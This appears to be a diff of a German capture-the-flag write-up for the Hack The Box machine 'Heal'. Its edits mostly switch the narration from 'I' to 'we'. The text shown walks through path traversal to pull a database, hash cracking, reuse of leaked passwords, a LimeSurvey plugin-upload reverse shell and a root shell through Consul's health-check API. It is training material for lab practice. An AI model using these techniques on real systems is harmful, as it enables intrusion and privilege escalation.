@@ -8,7 +8,7 @@ In this penetration test, we targeted the active HackTheBox machine "Heal", whic
 
 ## Network Setup
 
-Als erstes habe ich mich mit HTB durch openvpn verbunden: 
+Als erstes haben wir uns mit HTB durch openvpn verbunden:
 
 ```bash
 sudo apt update
@@ -18,7 +18,7 @@ sudo apt install openvpn -yd
 sudo openvpn Desktop/lab_lyfe691.ovpn
 
 ```
-Das war erfoglreich wie man auf der HTB website sehen kann: 
+Das war erfolgreich, wie man auf der HTB Website sehen kann:
 
 ![alt text](image.png)
 
@@ -26,7 +26,7 @@ Das war erfoglreich wie man auf der HTB website sehen kann:
 
 Die target ip ist: 10.10.11.46
 
-Um sicherzustellen, dass ein Dienst auf Port 80 aktiv ist, habe ich einen nmap scan durchgeführt:
+Um sicherzustellen, dass ein Dienst auf Port 80 aktiv war, führten wir einen nmap Scan durch:
 
 ```bash
 nmap -p 80 10.10.11.46
@@ -45,11 +45,11 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
 ```
 
-wie man sehen kann, gibt es einen service auf port 80
+Wie man sieht, gab es einen Service auf Port 80.
 
 ## DNS Configuration for heal.htb
 
-Da ich verbunden bin habe ich mich entschieden auf http://10.10.11.46 zugehen um den service anzuschauen. Als ich drauf ging hat es mich nach heal.htb redirected, unten der beweis: 
+Während  wir verbunden waren, entschieden wir uns, auf http://10.10.11.46 zu gehen, um den Service zu sehen. Als wir dorthin gingen, wurden wir zu heal.htb redirected – hier der Beweis:
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -63,7 +63,7 @@ Content-Length: 178
 Connection: keep-alive
 Location: http://heal.htb/
 ```
-Damit ich die Seite sehen konnte, musste ich den Hostnamen lokal auflösen. Dazu habe ich die Datei `/etc/hosts` bearbeitet und heal.htb auf die ip addresse der Maschine verwiesen.
+Damit wir die Seite sehen konnten, mussten wir den Hostnamen lokal auflösen. Dazu bearbeiteten wir die Datei /etc/hosts und verwiesen heal.htb auf die IP-Adresse der Maschine.
 
 ```bash
 sudo nano /etc/hosts
@@ -77,16 +77,16 @@ added line:
 
 ![1744656432925](image/Dokumentation/1744656432925.png)
 
-Diese Konfiguration ermöglichte es uns, die Weboberfläche über den korrekten virtuellen Host zu erreichen.
+Diese Konfiguration ermöglichte es uns, die Web-Oberfläche über den korrekten virtuellen Host zu erreichen.
 
 ## Initial Web Recon – heal.htb
 
-Dank der konfiguration kann ich jetzt die seite auf firefox sehen.
-Wie man sehen kann, wird eine login page angezeigt, was darauf hindeutet, dass möglicherweise ein Backend existiert.
+Dank der Konfiguration konnten wir die Seite nun mit Firefox sehen.
+Wie man sieht, wurde eine Login-Page angezeigt, was darauf hindeutet, dass möglicherweise ein Backend existiert.
 
 ![1744660028161](image/Dokumentation/1744660028161.png)
 
-Darum habe ich die Login Page getestet, und wie erwartet wurde ein Fehler angezeigt. Daher habe ich die console überprüft, um zu sehen, ob es irgendwo hindeuted.
+Darum testeten wir die Login-Page und wie erwartet wurde ein Fehler angezeigt. Folglich überprüften wir die Console, um zu sehen, ob die Login-Page irgendwo hindeutet.
 
 ![1744660324409](image/Dokumentation/1744660324409.png)
 
@@ -94,7 +94,7 @@ Der error `Cross-Origin Request Blocked: The Same Origin Policy disallows readin
 
 ## Subdomain Enumeration – api.heal.htb
 
-Damit ich die API sehen kann, habe ich, wie bereits bei heal.htb, den Eintrag in der Datei `/etc/hosts` hinzugefügt.
+Damit wir die API sehen konnten, haben wir den Eintrag wie bereits bei heal.htb in der Datei /etc/hosts hinzugefügt.
 
 ```bash
 sudo nano /etc/hosts
@@ -108,7 +108,7 @@ added line:
 
 ![1744663293352](image/Dokumentation/1744663293352.png)
 
-Sobald ich das hinzugefügt habe, können wir direkt mit der API interagieren.
+Sobald wir das hinzugefügt hatten, konnten wir direkt mit der API interagieren.
 
 ## Framework Fingerprinting
 
@@ -130,15 +130,15 @@ x-content-type-options: nosniff
 Server: nginx/1.18.0 (Ubuntu)
 ```
 
-## Looking at what i have found
+## Looking at what we have found
 
-Da ich jetzt zugriff auf die api habe, kann ich die bisher gefundenen sahcen testen. Das login und reigster der app funktionieren wie erwartet.
+Da wir nun Zugriff auf die API hatten, konnten wir die bisher gefundenen Sachen testen. Das Login und das Register der App funktionierten wie erwartet.
 
-Wenn ich mich registriere sehe ich die resume builder web app: 
+Wenn wir uns registrierten, sahen wir die Resume Builder Web App:
 
 ![1744665182786](image/Dokumentation/1744665182786.png)
 
-Ich habe mich ein bisschen mehr erkundet und sah die folgenden seiten: 
+Wir erkundeten uns noch ein wenig weiter und sahen die folgenden Seiten:
 
 profile page:
 
@@ -150,11 +150,11 @@ survey page:
 
 ## Survey inspection
 
-Auf der survey page habe ich den button gehovert und es zeigte eine php page und eine neue sub domain (`take-survey.heal.htb`) an (im unterricht haben wir das mit php angeschaut und dachte mir das ich xss oder so probieren könnte, ging aber nicht.). 
-
+Als wir auf der Survey Page über den Button «hoverten», wurde eine PHP Page und eine neue Subdomain (take-survey.heal.htb) angezeigt. Im Unterricht schauten wir es uns mit PHP an und wir dachten, dass wir XSS oder so ausprobieren könnten, doch das ging nicht. 
+  
 ![alt text](indexphpsh.png)
 
-wie immer, damit ich die seite ansehen kann habe ich den Eintrag in der Datei `/etc/hosts` hinzugefügt.
+Wie immer, wenn wir eine Seite ansehen wollten, fügten wir den Eintrag in der Datei `/etc/hosts` hinzu.
 
 ```bash
 sudo nano /etc/hosts
@@ -169,19 +169,19 @@ added line:
 ![alt text](Screenshot_2025-04-18_20_53_22.png)
 
 
-so, jetzt kann ich die survey page sehen: 
+so, jetzt können wir die survey page sehen: 
 
 ![alt text](Screenshot_2025-04-18_21_05_21.png)
 
-ich habe das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir dann anzeigt das es ein admin gibt, `ralph@heal.htb`. 
+wir haben das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir dann anzeigt das es ein admin gibt, `ralph@heal.htb`. 
 
 ![alt text](Screenshot_2025-04-19_15_13_54.png)
 
-Das sagt mir das es auch einen Admin login oder so geben sollte. Deswegen habe ich mich entschieden einfach mal `/admin` bei der url einzugeben um zu sehen ob es etwas gibt: 
+Das sagt uns das es auch einen Admin login oder so geben sollte. Deswegen haben wir uns mich entschieden einfach mal `/admin` bei der url einzugeben um zu sehen ob es etwas gibt: 
 
 ![alt text](image-1.png)
 
-wie man sehen kann hat es tatsächlich ein admin panel, aber da ich die login daten bzw. das Passwort nicht weis muss ich einen weg finden um es herauszufinden.
+wie man sehen kann hat es tatsächlich ein admin panel, aber da wir die login daten bzw. das Passwort nicht wissen müssen wir einen weg finden um es herauszufinden.
 
 ## Ralphs password
 
@@ -194,13 +194,13 @@ Beim Registrieren/Anmelden auf heal.htb wurde im network tab das jwt zurückgeli
 
 ![image with  in dev tools token: ey](image-3.png)
 
-also habe ich den token in eine variable gepackt um mein leben einfacher zu machen einfacher zu machen: 
+also haben wir den token in eine variable gepackt um mein leben einfacher zu machen einfacher zu machen: 
 
 ```bash
 export TOKEN='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE'
 ```
 
-Mit einem schnellen Check verifizierte ich, dass das Token gültig war:
+Mit einem schnellen Check verifizierten wir, dass das Token gültig war:
 
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
@@ -226,7 +226,7 @@ x-runtime: 0.003895
 ```
 
 #### 2. Path‑Traversal verifizieren
-Um die benötigte Anzahl `../` zu bestimmen, habe ich einen Mini‑Loop gebaut:
+Um die benötigte Anzahl `../` zu bestimmen, haben wir einen Mini‑Loop gebaut:
 
 ```bash
 for d in {3..9}; do
@@ -287,7 +287,7 @@ production:
 ```
 #### 4. SQLite‑DB herunterladen
 
-Wie man oben sehen kann ist die production datenbank unter `storage/development.sqlite3`, also habe ich sie heruntergeladen.
+Wie man oben sehen kann ist die production datenbank unter `storage/development.sqlite3`, also haben wir sie heruntergeladen.
 
 ```bash
 curl -s -H "Authorization: Bearer $TOKEN" \
@@ -323,7 +323,7 @@ lyfe@gmail.com|$2a$12$j6pguy5SKwp6DppLiMtz1OQJS9ALkxTGInJkB9f/o6zcms5.D5Zre
 
 #### 6. Nur Ralphs Hash isolieren & cracken
 
-unser ziel ist nur ralphs pwd, also habe ich ihn isoliert und das pwd mit hashcat gecrackt:  
+unser ziel ist nur ralphs pwd, also haben wir ihn isoliert und das pwd mit hashcat gecrackt:  
 
 ```bash
 grep '^ralph@' hashes.txt | cut -d'|' -f2 > ralph.hash
@@ -352,17 +352,17 @@ Benutzer : ralph@heal.htb
 Passwort : 147258369
 ```
 
-konnte ich mich unter http://take‑survey.heal.htb/admin einloggen und erhielt vollen Zugriff auf das LimeSurvey Backend (Version 6.6.4, -> wichtig.).
+konnten wir uns unter http://take‑survey.heal.htb/admin einloggen und erhielten vollen Zugriff auf das LimeSurvey Backend (**Version 6.6.4, -> wichtig.**).
 
 ![alt text](Screenshot_2025-04-19_17_49_00.png)
 
 ## Reverse Shell – www-data via LimeSurvey Plugin Upload
 
-Nachdem ich Zugriff auf das Admin panel von LimeSurvey hatte, habe ich nach der version 6.6.4 im internet gesucht um zu sehen ob es ein exploit gibt. Tatsächlich gab es ein RCE (remote code execution) exploit: 
+Nachdem wir Zugriff auf das Admin panel von LimeSurvey hatten, haben wir nach der version 6.6.4 im internet gesucht um zu sehen ob es ein exploit gibt. Tatsächlich gab es ein RCE (remote code execution) exploit: 
 
 https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
 
-Da Standart Payloads die web ui oft zum Absturz bringen (504 Gateway Timeout), habe ich ein nicht-blockierendes Reverse‑Shell‑Plugin mit hilfe des githubs erstellt, das sich problemlos installieren und triggern lässt.
+Da Standart Payloads die web ui oft zum Absturz bringen (504 Gateway Timeout), haben wir ein nicht-blockierendes Reverse‑Shell‑Plugin mit hilfe des githubs erstellt, das sich problemlos installieren und triggern lässt.
 
 #### 1. Exploit‑Plugin bauen, mit hilfe des github: https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
 
@@ -413,7 +413,7 @@ cat > config.xml <<'EOF'
 EOF
 ```
 
-Zip archive erstellen damit ich es hochladen kann: 
+Zip archive erstellen damit wir es hochladen kann: 
 
 ```bash
 zip lyfe691-exploit.zip php-rev.php config.xml
@@ -454,16 +454,16 @@ www-data@heal:/var/www/limesurvey$
 ```
 ![alt text](Screenshot_2025-04-19_20_30_08.png)
 
-Jetzt hatte ich eine voll funktionsfähige shell als www-data auf der Maschine.
+Jetzt hatten wir eine voll funktionsfähige shell als www-data auf der Maschine.
 
 ## User Flag
 
-Nach dem Exploit über limesurvey hatte ich Zugriff als www-data.
+Nach dem Exploit über limesurvey hatten wir Zugriff als www-data.
 Ziel war es nun, auf einen lokalen Benutzer mit echten Rechten zu wechseln. inkl userflag holen.
 
 #### 1. Web-Passwort war nicht systemweit gültig
 
-Zuerst versuchte ich das bereits gecrackte Web Passwort von ralph@heal.htb (147258369) für lokale Benutzer:
+Zuerst versuchten wir das bereits gecrackte Web Passwort von ralph@heal.htb (147258369) für lokale Benutzer:
 
 su ralph     # funktioniert nicht
 su ron       # auch fehlgeschlagen
@@ -478,7 +478,7 @@ Im Verzeichnis:
 
 `/var/www/limesurvey/application/config/`
 
-fand ich in der Datei config.php die Zugangsdaten für die PostgreSQL Datenbank. inklusive Passort:
+fanden wir in der Datei config.php die Zugangsdaten für die PostgreSQL Datenbank. inklusive Passort:
 
 'username' => 'db_user',
 'password' => 'AdmiDi0_pA$$w0rd',
@@ -566,7 +566,7 @@ return array(
 /* Location: ./application/config/config.php */
 ```
 
-Da viele Systeme schwache Passwort policies und reuse verwenden, habe ich versucht, mich mit diesem Passwort als Benutzer ron einzuloggen.
+Da viele Systeme schwache Passwort policies und reuse verwenden, haben wir versucht, uns mit diesem Passwort als Benutzer ron einzuloggen.
 #### 3. su auf ron
 ```
 www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ su ron
@@ -615,7 +615,7 @@ wie man sehen kann ist das userflag:
 
 ## Root Flag
 
-Nach dem Zugriff als Benutzer ron habe ich mit netstat überprüft, welche Ports auf der Maschine geöffnet waren:
+Nach dem Zugriff als Benutzer ron haben wir mit netstat überprüft, welche Ports auf der Maschine geöffnet waren:
 
 ```bash
 netstat -tulnp | grep LISTEN
@@ -640,7 +640,7 @@ Interessanter Output:
 
 `tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -`
 
-Der Dienst auf Port 8500 hörte nur lokal - das bedeutet: ich musste ihn über einen SSH tunnel zugänglich machen.
+Der Dienst auf Port 8500 hörte nur lokal - das bedeutet: wir mussten ihn über einen SSH tunnel zugänglich machen.
 SSH Port Forwarding zur lokalen Maschine
 
 ┌──(kali㉿kali)-[~]
@@ -686,13 +686,13 @@ Last login: Sat Apr 19 07:40:49 2025 from 10.10.14.29
 ron@heal:~$
 ```
 
-Danach konnte ich im Browser auf http://localhost:8500 zugreifen und sah das Consul UI.
+Danach konnten wir im Browser auf http://localhost:8500 zugreifen und sah das Consul UI.
 
 ![alt text](Screenshot_2025-04-20_15_15_55.png)
 
 ### Exploiting Consul via HTTP API
 
-Mit Consuls HTTP API lässt sich ein "Health Check" registrieren, der beliebige Kommandos ausführt. Ich nutzte das, um eine Root Reverse shell zu bekommen:
+Mit Consuls HTTP API lässt sich ein "Health Check" registrieren, der beliebige Kommandos ausführt. Wir nutzten das, um ein Root Reverse shell zu bekommen:
 
 ```
 ron@heal:~$ curl -X PUT -d '{
@@ -761,9 +761,9 @@ drwxrwxrwt  14 root root  4096 Apr 20 18:48 tmp
 drwxr-xr-x  14 root root  4096 Dec  8 13:57 usr
 drwxr-xr-x  13 root root  4096 Dec  8 13:57 var
 ```
-Beim dutchstöbern habe ich folgendes file gefunden: `root.txt`.
+Beim dutchstöbern haben wir folgendes file gefunden: `root.txt`.
 
-Jetzt musste ich es nur noch lesen: 
+Jetzt mussten wir es nur noch lesen: 
 
 ```
 root@heal:/# cat /root/root.txt
